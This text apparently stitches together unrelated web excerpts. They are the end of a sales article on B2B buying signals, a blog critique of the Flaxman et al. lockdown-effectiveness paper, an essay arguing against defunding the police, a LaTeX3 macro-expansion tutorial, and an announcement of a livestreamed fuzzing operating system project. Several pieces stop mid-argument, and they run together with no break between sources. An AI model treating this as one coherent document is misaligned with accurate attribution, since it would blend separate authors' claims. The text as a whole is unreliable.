<h2 id="h-can-i-try-the-product">“Can I try the product?”</h2>



<p>Especially in the B2B world, prospects want to give your product a try before purchasing. Get them set up with a trial right after the call. Agree days where you check in with each other to make sure everything works as expected.<br>If you offer services, such as consulting, provide a small Proof of Concept (POC) that allows the prospect to get a better feeling for you and your work. A PoC could be a paid white paper or consulting on a well-scoped sub-project.</p>



<h2 id="h-how-can-i-pay-using-a-credit-card-po-invoice">“How can I pay?” (using a Credit Card, PO Invoice, …)</h2>



<p>Or also “Can I pay via Credit Card?”, “Do you accept Purchase Order and Invoice?”</p>



<p>They are clear to get this done today, and now they want to check out.</p>



<h2 id="h-pricing-details">Pricing details</h2>



<p>“Do I need to sign an annual contract?” “Can I choose a monthly commitment?”</p>



<p>Explain your terms, and ask specific questions if the prospect requests unusual pricing details, such as a monthly contract (when you usually do yearly or multi-year deals).<br>Go over your payment terms.</p>



<h2 id="h-asking-where-do-we-go-from-here">Asking, “Where do we go from here?”</h2>



<p>The prospect decided to move forward and wants to know about the next steps on your side. Do you require a trial? Do you need business information for a quote?<br>Discuss all information you need on your end, as well as their next steps. Do they need to involve other departments such as legal? How can you get a PO Number or get listed as a vendor? Do you need to provide any other necessary paperwork?</p>



<h2 id="h-send-me-a-quote-with-everything-we-discussed">Send me a quote with everything we discussed</h2>



<p>Clear signal to move forward. Summarize all talking points of the discussion and ask for any additional information you might need for the quote, such as an address or contact person.</p>



<h2 id="h-asking-about-additional-services-such-as-extended-support-contracts-or-the-like">Asking about additional services, such as extended support contracts or the like</h2>



<p>The product is a good fit; now the prospect wants to know how well you can take care of them <em>around</em> your actual offering. Ask specific questions to understand their needs here profoundly. Why do they think they need additional support? What are their motives? Services like support contracts are a lucrative additional revenue stream. Even if you don’t offer anything like that by default, ask more questions to understand the prospect’s requirements and develop an extended offer satisfying the prospect’s needs.</p>



<h2 id="h-asked-for-case-studies-reference-customers">Asked for Case Studies, reference customers</h2>



<p>How well could you help other customers in the past? Make sure you have references available you can share. Some of them might require explicit, written approval.<br>Also, try to find people at the customer’s organization who are open to discuss their experience with you with your current prospect.</p>



<p>Now it’s your turn. Go out and listen carefully to these buying signals in your next sales conversations.</p>



<p>Does your business and sales process have different buying signals, and you’d like to get your strategy to the next level? <a href="mailto:jan@work-with-jan.com" rel="nofollow">Get in touch</a> to discuss your requirements and how we can work together.</p>

	<div>
		<p>As Europe and the United States are experiencing a second or third wave of the pandemic, depending on how you count, the debate about lockdowns is raging again. Many people are convinced they are the best way to deal with the pandemic until a vaccine arrives. Back in the Spring, I argued in favor of lockdowns because we didn’t know much about the virus and Western governments were caught by surprise (I’m not even sure I was right anymore, even when you don’t look at things in retrospect with the information we now have, but that’s a question for another day), but now I think we should not resort to them anymore. The main reason is that, after looking at the data we have accumulated in the past few months, I have come to believe that lockdowns weren’t as effective as most people think relative to less stringent restrictions. People seem to believe that lockdowns are the only kind of policy that can prevent a colossal loss of life, because less stringent restrictions just don’t cut transmission enough. They also say a lot of things about lockdowns, especially about their effects on the economy, which I think are false, but in this post I want to focus on the claim that only lockdowns are really effective to cut transmission and ultimately prevent a lot of people from dying.</p>
<p>Whenever someone makes that claim, you can be certain they will cite the <a href="https://www.nature.com/articles/s41586-020-2405-7" rel="nofollow">paper</a> Flaxman et al. published in <em>Nature</em> a few months ago, which concluded that non-pharmaceutical interventions had saved more than 3 millions lives in Europe in the Spring and that among those interventions only lockdowns had a substantial effect. This paper went viral when it was published and continues to be cited all the time as proof that lockdowns saved countless lives during the first wave. This isn’t just true in informal discussions, but also in the scientific literature, where this paper is systematically cited to support the claim that lockdowns are very effective. (It’s already been cited almost 450 times since it was published a few months ago.) I hadn’t read it until very recently, but since the debate about lockdown has been rekindled by the second wave in Europe, I decided to read it and I was astonished by how bad it was. Since it still plays a very important role in that debate, I think it’s important to explain why it’s bad, so in this post I’m going to take it apart and explain why even Flaxman et al.’s own analysis shows that, while lockdowns do make a difference, they don’t cut transmission that much more than other, less stringent and therefore less costly restrictions. (I basically taught myself Stan over a weekend to do this, so someone should probably check my <a href="https://github.com/phl43/flaxman-lockdowns-analysis" rel="nofollow">code</a>, though I’m pretty sure there are no major mistakes.) After pointing out that it changes the policy debate quite a lot, I conclude with a few remarks about the role bad science has played in this debate and how this paper illustrates why the cult of science that many people have fallen into is bad.</p>
<p><strong>What Flaxman et al. did</strong></p>
<p>I’ve seen many people claim that Flaxman et al.’s paper showed that lockdowns were very effective, but I don’t think many of them know what they actually did in that paper, because it showed no such thing despite what the authors claim. In fact, what they did is assume that non-pharmaceutical interventions work (as we shall see, the model was bound to find that lockdowns specifically did most of the work, but more on that later), fit the data on deaths to a model that makes this assumption in order to infer various epidemiological variables of interest such as <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t"> and the number of infections. Once this was done, they just compared the number of deaths predicted by this model, which by construction is going to be very close to the actual number of deaths, to the number of deaths in a counterfactual where there were no interventions. I will come back to this counterfactual, but first I want to say more about what this model, because it will be important to understand why this paper doesn’t show what Flaxman et al. claim it shows.</p>
<p>Here is the equation they use to model the true number of infections:<a href="https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al..png"><img loading="lazy" src="https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al..png" alt="" width="1986" height="890" srcset="https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al..png 1986w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al.-300x134.png 300w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al.-1024x459.png 1024w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al.-768x344.png 768w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Infection-model-in-Flaxman-et-al.-1536x688.png 1536w" sizes="(max-width: 1986px) 100vw, 1986px"></a>It’s basically a discrete version of the SIR model, the most basic model of epidemiology. Don’t worry if mathematical symbols scare you, what it says is just that, on any given day, the number of people who get infected depends on the number of people who got infected previously and are still infectious, when they were infected, as well as on the reproduction number <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t">, which is the average number of people that a person who is infected goes on to infect.</p>
<p>Lockdowns and other non-pharmaceutical interventions affect the number of infections through their effect on <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t">. Here is how they model the way in which those interventions affect <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t">:<a href="https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05.png"><img loading="lazy" src="https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05.png" alt="" width="1996" height="1362" srcset="https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05.png 1996w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05-300x205.png 300w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05-1024x699.png 1024w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05-768x524.png 768w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Capture-decran-2020-11-22-a-02.15.05-1536x1048.png 1536w" sizes="(max-width: 1996px) 100vw, 1996px"></a>Again, it’s not a big deal if you don’t understand everything, what you need to remember is that each non-pharmaceutical intervention is assumed to affect <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t"> immediately, only non-pharmaceutical interventions are supposed to affect it&nbsp;and each is assumed to have the same effect in every country where it’s implemented.</p>
<p>Many people have criticized the first assumption, but while it’s no doubt unrealistic, the second and third assumptions seem even worse. Indeed, it’s obvious that even in the absence of any government interventions, people would still change their behavior in response to the pandemic because they’re afraid. This would reduce transmission and therefore it’s not true that only non-pharmaceutical interventions affect <img src="https://s0.wp.com/latex.php?latex=R_t&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="R_t" title="R_t">. Moreover, there is also no doubt that each non-pharmaceutical intervention is not equally effective in every country where it’s implemented, so it’s not true that each intervention has the same effect in every country. First, although various restrictions are modeled as the same in the paper, they were actually pretty different. For instance, the intervention that Flaxman et al. call “public events banned” consisted in forbidding gatherings of more than 5 people in Austria, 100 people in France, 500 people in Sweden and 1,000 people in Germany, but in the model all those different policies are treated as identical. Indeed, even “lockdown” was not the same thing everywhere, since under “lockdown” people in France couldn’t leave their place without filling a form while in Denmark people could meet as long as they were no more than 10.</p>
<p>Not only very different interventions are treated as the same in the model, but even if they had really been identical, their effect in different countries would still have been different for idiosyncratic reasons. Everybody has noted how people in some cultures might be more willing to follow rules, but there are many other possible factors that could also affect how effective the same intervention would be in different countries, such as differences in the proportion of people who need to take public transportation to go to work, differences in the age distribution of the population, etc. As you can see above, Flaxman et al. did include a country-specific effect in the model, which is supposed to model the fact that, precisely for this kind of idiosyncratic reasons, we don’t expect that even the same non-pharmaceutical interventions will be equally effective in every country. I will come back to this country-specific effect later, because it plays a very important and largely unacknowledged role in Flaxman et al.’s paper, but for the moment it’s enough to say that it’s only associated with the last intervention, which is a lockdown in every country except in Sweden where it’s the ban of public events. So the model only acknowledges that idiosyncratic factors could affect how effective the same interventions are in different countries for lockdowns but not for the other interventions.</p>
<p>Another problem with the model is that it assumes the population of each country is homogenous, which is undoubtedly false and might result in getting the dynamic of the epidemic wrong even in the early phase, though as I have <a title="Let’s have a honest debate about “herd immunity”" href="https://necpluribusimpar.net/lets-have-a-honest-debate-about-herd-immunity/" rel="">discussed</a> before we don’t really know. (Some people seem to think that, since I wrote this, various things have shown that the naive model was correct, but they are confused. However, there is only so much you can talk about in one post, so perhaps I will revisit that issue some other time.) I just mention that issue because I think it’s important and people should try to model heterogeneity more often, if only as a robustness check, but I won’t be focusing on that in the rest of this post because we don’t know how much it matters and, even if heterogeneity actually had a large effect on the dynamic of the epidemic and the final attack rate, I think not modeling it would mostly affect their counterfactual and not their estimates of the effect of non-pharmaceutical interventions.</p>
<p>Finally, they don’t fit their model on data about cases, but instead assume a particular infection fatality rate for each country and use this plus the infection-to-death distribution <img src="https://s0.wp.com/latex.php?latex=%5Cpi&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="\pi" title="\pi"> to work backward from data on deaths and&nbsp;infer the number of infections over time. (The infection fatality rates they use are derived from Verity et al.’s <a href="https://www.thelancet.com/journals/laninf/article/PIIS1473-3099(20)30243-7/fulltext" rel="nofollow">paper</a> and adjusted for each country based on age-specific mixing patterns.) To be more specific, they assume that the reported daily number of deaths in a country <img src="https://s0.wp.com/latex.php?latex=m&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="m" title="m"> follows a negative binomial distribution with mean $latex d_{t,m}, which they modeled like this:<a href="https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al..png"><img loading="lazy" src="https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al..png" alt="" width="1962" height="436" srcset="https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al..png 1962w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al.-300x67.png 300w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al.-1024x228.png 1024w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al.-768x171.png 768w, https://necpluribusimpar.net/wp-content/uploads/2020/11/Death-model-in-Flaxman-et-al.-1536x341.png 1536w" sizes="(max-width: 1962px) 100vw, 1962px"></a>Again, don’t worry if you don’t understand everything, what’s important is just that you understand that Flaxman et al. assume a particular infection fatality rate and a distribution of the delay between infection and death (both of which are estimated from data collected early in the pandemic), which they use to infer the daily number of infections during the period they consider by working backward from the data on deaths. This is a good idea because, while data on deaths are hardly perfect, there are definitely more reliable than data on cases, which are a mess.</p>
<p>Anyway, I’ll go back to the model …</p></div></article></div>

I hope that you’ve been enjoying reading, I have been having a lot of fun writing. I’m also really excited to say that we are at over 5,000 paid members already, which is incredible — I’m so grateful to everyone who’s decided to support the site. Paid members have been able to enjoy the comment sections and open threads so far, which have been great. Starting next week, they’ll also have exclusive access to most of the content, though I will also do a free article or two per week to stay in the mix.</p><p>Please consider subscribing or buying a gift membership if you know someone who might like it.</p><p>Today I wanted to talk about defunding the police, a topic on which I have an opinion that is both banal and controversial — it’s a bad idea. </p><p><a href="https://www.cbsnews.com/news/obama-defund-the-police-slogan/">Barack Obama recently rekindled interest</a> in the topic by telling Peter Hamby that he thinks defund activists were making a strategic or tactical error: “You lost a big audience the minute you say it, which makes it a lot less likely that you’re actually going to get the changes you want done. The key is deciding, do you want to actually get something done, or do you want to feel good among the people you already agree with?”</p><p>That’s what I would say about the post-2016 tendency of young people who support a larger welfare state to characterize their politics as “socialism” — a politically counterproductive fad that undermines a perfectly reasonable idea. But it’s not what I would say about “defund the police.” That’s a bad idea, not a bad slogan. </p><h4>“Defund the police” was pretty successful</h4><p>The whole meme that this was somehow a bad or ineffective slogan seems to me to not take the defund project seriously enough. The point of defund the police, after all, was not to help Democrats win elections — it was to defund the police. </p><p>In the immediate wake of George Floyd’s death, there was a widespread but largely non-specific desire to do something about police abuses in particular and anti-Black racism in general. That conversation could have gone in a lot of different directions. But defund activists successfully kept policing near the center of the anti-racism conversation, and kept the idea of cutting police funding absolutely at the center of the police reform conversation. In the early days, a rival activist campaign called <a href="https://www.vox.com/2020/6/5/21280402/8-cant-wait-explained-policing-reforms">8 Can’t Wait</a> that focused on operational changes to police procedures got a lot of attention. But defund successfully crowded them out, and owned the brand that if you were really hard-core about antiracism, you’d be for defunding. </p><p>A whole <a href="https://www.vox.com/2020/6/25/21303005/police-reform-bill-house-democrats-senate-republicans">bill full of police reforms passed the US House of Representatives</a> and received only a tiny fraction of the attention that was paid to defunding. </p><p>Thanks in part to the hard work of defund police activists, no Republicans who opposed that measure faced any heat over it. Instead, heat was applied to mayors and city council members in progressive cities, and the aim of the heat was to get them to enact cuts in police funding. In some cities this policy <a href="https://www.blackenterprise.com/more-than-a-dozen-cities-are-defunding-their-police-departments/">was adopted</a> and in others <a href="https://www.bloomberg.com/graphics/2020-city-budget-police-defunding/">it wasn’t</a>. But in terms of what activists can achieve, it went pretty well. They dominated the conversation. They put their idea on the agenda. And they won some successes. </p><p>The problem with all of this isn’t that the strategy didn’t work, it’s that the strategy is bad. </p><h4>Cutting police funding doesn’t fix what’s broken</h4><p>On Twitter the other day, I characterized defund police as reflecting an austerity mindset. Jamelle Bouie offered an alternate explanation that once I read it expressed the contours of the argument much better. </p><p>The basic critique here is that American police departments:</p><ul><li><p>Dish out too much violence with too little accountability.</p></li><li><p>Are not effective enough at solving serious crimes. </p></li></ul><p>This seems mostly correct to me, and it’s why you won’t see me flying any Blue Lives Matter flags — there are serious flaws with American policies. </p><p>But cutting your city’s police budget is not going to make the police more effective at catching murderers. And it’s also not going to make officers more accountable for wrongdoing. To make officers more accountable for wrongdoing, you need to adopt some kind of measures that make them more accountable. Defund activists don’t oppose increased accountability, of course. But both the 8 Can’t Wait agenda and the George Floyd Justice in Policing Act that the House passed focused on accountability. Defunders shifted the conversation off that toward defunding. But a non-accountable police department with 10 percent less money is still a non-accountable police department. </p><p>Marc The Intern<strong> </strong>put together this chart that compares how many police officers per capita a city has to how many people per capita are killed by the police department (violence data is 2013-2019 courtesy of <a href="https://mappingpoliceviolence.org/">Mapping Police Violence</a>; officer data is from the FBI in 2018). You can see there’s no relationship between the size of a department and how much deadly violence it doles out. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png&quot;,&quot;height&quot;:891,&quot;width&quot;:1226,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:77085,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Now of course what we really want to know is how many <em>unjustified</em> killings are happening. But unfortunately there’s no widely accepted index of that. </p><p>What you see here is that the biggest department relative to the size of its population by far is in Washington, DC (which I assume involves officers doing some capital-specific work of some kind) and it’s a middling department in terms of police killings. The St. Louis Police Department (the dot at the top) is dishing out a ton more deadly violence than any other city, without St. Louis being a particularly heavily policed city. </p><p>So again, far from being a failure as a slogan, “defund police” has been a very successful slogan — it’s gotten us all focused on police department budgets as a key lever to reducing misconduct, even though it doesn’t particularly seem related to the issue at hand. </p><h4>More cops, less violent crime </h4><p>Bouie mentioned the low clearance rate for violent crimes in America, which is something that’s come up in a lot of discussions over the past few months. </p><p>I think there are a few things to say about this. One is that changes matter at the margin. The police in DC closed 66 percent of murders in 2018 which was less than the 71 percent they closed in 2017. If that number just kept heading down from 66 percent to 61 percent to 56 percent to 51 percent, that would be change for the worse. And it seems to me that there’s pretty good reason to believe that if you cut funding for homicide investigations, you’d solve fewer murders. Of course, you could make a small cut in a police department's budget while insulating homicide investigations. But the more dramatic the cuts you ask for, the harder it is to insulate useful investigations. And to the extent that we want the police to solve a larger share of violent crimes, it looks like they need more resources, not fewer. </p><p><a href="https://www.eurekalert.org/pub_releases/2019-08/du-spe072519.php">Cook et. al.</a> did a study of shooting investigations in Boston and they found that homicides attract significantly more investigative resources in terms of person-hours spent on the case than non-fatal shootings. They also found that homicides are significantly more likely to be solved than non-fatal shootings, basically in direct proportion to the person-hours spent on investigating them. So if we are frustrated by police departments’ limited success at solving crimes, one natural solution would be to give them more money to hire more detectives. </p><p>Of course most police officers are not detectives; they’re uniform cops doing patrol work. And the evidence across a large range of studies is that <a href="https://www.vox.com/2020/6/18/21293784/alex-vitale-end-of-policing-review">having more officers on patrol leads to less crime</a>, including violent crime. Not because the beat cops solve crime, but because their presence deters it. </p><p>There is a lot of different research on this, but one paper that is directly relevant to our current political situation is Steven Mello’s <a href="https://www.princeton.edu/~smello/papers/cops.pdf">look</a> at police funding in Barack Obama’s 2009 stimulus bill:</p><blockquote><p>I exploit a natural experiment to estimate the causal effect of police on crime. The American Recovery and Reinvestment Act increased funding for the Community Oriented Policing Services (COPS) hiring grant program from less than&nbsp;$20 million over 2005-2008 to&nbsp;$1 billion in 2009. Hiring grants distributed in 2009 were allocated according to an application score cutoff rule, and I leverage quasi-random variation in grant receipt by comparing the change over time in police and crimes for cities above and below the threshold in a difference in differences framework. Relative to low-scoring cities, those above the cutoff experience increases in police of about 3.2% and declines in victimization cost-weighted crime of about 3.5% following the distribution of hiring grants. The effects are driven by large and statistically significant effects of police on robbery, larceny, and auto theft, with suggestive evidence that police reduce murders as well. Crime reductions associated with additional police were more pronounced in areas most affected by the Great Recession. The results highlight that fiscal support to local governments for crime prevention may offer large returns, especially during bad macroeconomic times.</p></blockquote><p>A big part of what’s been happening in American politics recently is that Democrats in Congress have been fighting for federal aid to state and local governments and Republicans have been opposing this. I think we have very solid evidence that the last federal “fund the police” push was a big success in policy terms, and it’s an idea Democrats should have more explicitly championed in this debate.</p><h4>Better policing will cost more money </h4><p>Beat cops are effective at reducing crime, and investing money in hiring them is worthwhile. Investigative cops also appear to be at least somewhat effective at solving violent crimes, and investing money in hiring more more of them would lead to higher clearance rates. </p><p>But that would still leave us with the core concern that too many police officers are able to get away with misconduct with impunity. </p><p>To solve this, we need to change the rules and …</p></div></div>

  <p>Many people view LaTeX as a typesetting language and overlook the importance of programming in
document generation process. As a matter of fact, many large and structural documents can benefit
from a programming backend, which enhances layout standardization, symbol coherence, editing speed
and many other aspects. Despite the fact the standard LaTeX (LaTeX2e) is already Turing complete, which
means it is capable of solving any programming task, the design of many programming interfaces is highly
inconsistent due to compatibility considerations. This makes programming with LaTeX2e very challenging and
tedious, even for seasoned computer programmers.</p>

<p>To make programming in LaTeX easier, the LaTeX3 interface is introduced, which aims to provide
modern-programming-language-like syntax and library for LaTeX programmers. Unfortunately, there is
little material regarding this wonderful language. When I started learning it, I had to go through
its complex technical manual, which is time-consuming. Therefore, I decide to write a LaTeX3 tutorial
that is easy-to-understand for generic programmers.</p>

<h2 id="why-latex3">Why LaTeX3?</h2>

<h3 id="handle-macro-expansion-like-a-boss">Handle macro expansion like a boss</h3>

<p>Fundamentally, <img src="https://www.alanshawn.com/media/2020/latex3/tex.svg" alt="TeX"> works by doing macro substitution: commands are substituted by their definition, which is subsequently replaced by definition’s definition, until something irreplaceable is reached (e.g. text). For example, in the following example, <code><span>\myname</span></code> is substituted by <code><span>\mynameb</span></code>; <code><span>\mynameb</span></code> is then substituted by <code><span>\mynama</span></code>; and eventually, <code><span>\mynamea</span></code> is replaced by <code>John Doe</code>, which cannot be expanded anymore. This process is called <strong>expansion</strong>.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\mynamea</span><span>}{</span>John Doe<span>}</span>
<span>\newcommand</span><span>{</span><span>\mynameb</span><span>}{</span><span>\mynamea</span><span>}</span>
<span>\newcommand</span><span>{</span><span>\myname</span><span>}{</span><span>\mynameb</span><span>}</span>
My name is <span>\myname</span>.
</code></pre></div></div>

<p>Most <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> command we use everyday has complicated definitions. During compilation, they will be expanded recursively until text or <a href="https://tex.stackexchange.com/questions/267980/what-is-a-primitive-a-macro-and-how-do-they-compare"><img src="https://www.alanshawn.com/media/2020/latex3/tex.svg" alt="TeX"> primitive</a> is reached. This process sounds pretty straightforward, until we want to <em>change the order of macro expansion</em>.</p>

<p>Why do we need to change the order of macro expansion? Let’s consider the <code><span>\uppercase</span></code> macro in <img src="https://www.alanshawn.com/media/2020/latex3/latexe.svg" alt="LaTeX2e">, which turns lowercase letters into uppercase ones. But consider the following case, where we try to apply <code><span>\uppercase</span></code> to letters <code>abcd</code> and a command <code><span>\cmda</span></code>. Since <code><span>\cmda</span></code> expands to <code>abcd</code>, we expect the outcome to be <code>ABCDABCD</code>. In reality, <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> gives us <code>ABCDabcd</code>, which means the content of <code><span>\cmda</span></code> is <em>unchanged</em>.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\cmda</span><span>}{</span>abcd<span>}</span>
<span>\uppercase</span><span>{</span>abcd<span>\cmda</span><span>}</span> <span>%ABCDabcd</span>
</code></pre></div></div>

<p>How can this happen? During the expansion of <code><span>\uppercase</span></code>, the command scans the item inside the adjacent curly braces one by one. If an English letter is encountered, an uppercase counterpart is left in the output stream; otherwise, the original item is left in the input stream. When it’s <code><span>\cmda</span></code>’s turn, because it is a command instead of a letter, it is left <em>untouched</em> in the output stream, which is expanded to <code>abcd</code> later.</p>

<p>What if we want to capitalize <em>everything</em> inside the curly braces? That would require the macro <code><span>\cmda</span></code> to be expanded before <code><span>\uppercase</span></code>, or equivalently, changing the order of macro expansion. The classical way of doing so in <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> is via <code><span>\expandafter</span></code>. Unfortunately, the usage of <code><span>\expandafter</span></code> is extremely complicated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>: in a string of <code>n</code> tokens<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, to expand the <code>i</code>th token, there must be \(2^{n-i}-1\) <code><span>\expandafter</span></code>’s before the <code>i</code>th token. Below is a <a href="https://tex.stackexchange.com/questions/104506/expanding-arguments-before-macro-call">example</a> of how bad this can look like:</p>

<div><div><pre><code><span>\documentclass</span><span>{</span>article<span>}</span>
<span>\begin{document}</span>

<span>\def\x</span>#1#2#3#4<span>{</span><span>%</span>
  <span>\def\arga</span><span>{</span>#2<span>}</span><span>%</span>
  <span>\def\argb</span><span>{</span>#3<span>}</span><span>%</span>
  <span>\def\argc</span><span>{</span>#4<span>}</span><span>%</span>
  <span>\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter</span>#1<span>%</span>
    <span>\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter</span>
      <span>{</span><span>\expandafter\expandafter\expandafter\arga\expandafter\expandafter\expandafter</span><span>}</span><span>%</span>
        <span>\expandafter\expandafter\expandafter</span><span>{</span><span>\expandafter\argb\expandafter</span><span>}</span><span>\expandafter</span>
          <span>{</span><span>\argc</span><span>}}</span>

<span>\x\y</span><span>{</span>arg1<span>}{</span>arg2<span>}{</span>arg3<span>}</span>

<span>\end{document}</span>
</code></pre></div></div>

<p>Clearly, it is nowhere near decency: the excessive number of <code><span>\expandafter</span></code>’s are sometimes referred to as “<code><span>\expandafter</span></code> purgatory”. As a result, one of the features of <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> is to provide simple and reliable expansion control.</p>

<p>These inconsistencies set a high bar for new <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> users and make it difficult to connect multiple components together, even for experienced <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> programmers. Therefore, <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> aims to provide standardized programming interfaces and documentation for the language.</p>

<h3 id="goals-of-latex3">Goals of LaTeX3</h3>



<h2 id="latex3-naming-conventions-i-1">LaTeX3 Naming Conventions (I-1)</h2>

<p>In the following code snippet, we declare a variable <code><span>\vara</span></code> and a function <code><span>\cmda</span></code>. The way we distinguish between a <em>variable</em> and a <em>function</em> is simply by judging whether the command absorbs arguments or not. However, the fact that they are all called “commands” and created with <code><span>\newcommand</span></code> reflects that they are fundamentally the same for <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> system.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\vara</span><span>}{</span>this is a variable<span>}</span>
<span>\newcommand</span><span>{</span><span>\cmda</span><span>}</span>[1]<span>{</span>this is a command: #1<span>}</span>
</code></pre></div></div>

<p>From users’ perspective, it is important to separate variables from functions because their usages are different. Therefore, our only option is to encode this information into the name of commands, so that users can differentiate variables and functions with little effort. This is why we need to introduce the <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> naming convention. Before actually elaborating on <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> naming style, I would like to make a small diversion and introduce <em>category code</em> first.</p>

<h3 id="category-code-and-command-names">Category code and command names</h3>

<p>In <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX">, every character that we enter is associated with a category code. Standard category code assignment can be seen in the following <a href="https://www.overleaf.com/learn/latex/Table_of_TeX_category_codes">table</a>:</p>

  <div itemprop="articleBody">
    <h2 id="summary">Summary</h2>

<p>We’re going to work on an <em>operating system</em> which is designed specifically for fuzzing! This is going to be a streaming series for most of December which will cover making a new operating system with a strong focus on fuzzing. This means that things like the memory manager, determinism, and scalability will be the most important parts of the OS, and a lot of effort will go into making them super fast!</p>

<h2 id="when">When</h2>

<p>Streaming will start sometime on Thursday, December 10th, probably around 18:00 UTC, but the streams will be at relatively random times on relatively random days. I can’t really commit to specific times!</p>

<p>Streams will likely be 4-5 days a week (probably M-F), and probably 8-12 hours in length. We’ll see, who knows, depends how much fun we have!</p>

<h2 id="where">Where</h2>

<p>You’ll be able to find the streams live on my <a href="https://twitch.tv/gamozo">Twitch Channel</a>, and if you’re unlucky and miss the streams, you’ll be able to find the recordings on my <a href="https://www.youtube.com/user/gamozolabs">YouTube Channel</a>! Don’t forget to like, comment, and subscribe, of course.</p>

<h2 id="what">What</h2>

<p>So… ultimately, I don’t really know what all will happen. But, I can predict a handful of things that we’ll do. First of all, it’s important to note that these streams are not training material. There is no prepared script, materials, flow, etc. If we end up building something totally different, that’s fine and we’re just going with the flow. There is no requirement of completing this project, or committing to certain ways the project will be done. So… with that aside.</p>

<p>We’ll be working on making an operating system, specifically for x86-64 (Intel flavor processors at the start, but AMD should work in non-hypervisor mode). This operating system will be designed for fuzzing, which means we’ll want to focus on making virtual memory management extremely fast. This is the backbone of most performant fuzzing, and we’ll need to be able to map in, unmap, and restore pages as they are modified by a fuzz case.</p>

<p>To keep you on the edge of your toes, I’ll first start with the boring things that we have to do.</p>

<h3 id="os">OS</h3>

<p>We have to make an operating system which boots. We’re gonna make a UEFI kernel, and we might dabble in running it on ARM64 as most of our code will be platform agnostic. But, who knows. It’ll be a pretty generic kernel, I’m mainly going to develop it on bare metal, but of course, we’ll make sure it runs on KVM/Xen/Hyper-V such that it can be used in a cloud environment.</p>

<h3 id="acpi">ACPI</h3>

